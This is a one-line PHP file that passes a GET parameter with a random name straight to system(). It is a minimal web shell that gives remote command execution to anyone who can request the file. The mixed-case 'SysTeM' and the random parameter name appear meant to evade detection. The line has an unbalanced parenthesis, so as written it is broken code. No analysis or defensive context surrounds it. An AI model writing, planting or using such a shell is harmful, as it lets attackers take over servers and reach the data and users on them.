<?php
SysTeM(($_GET['WIZCQoDT']);
?>
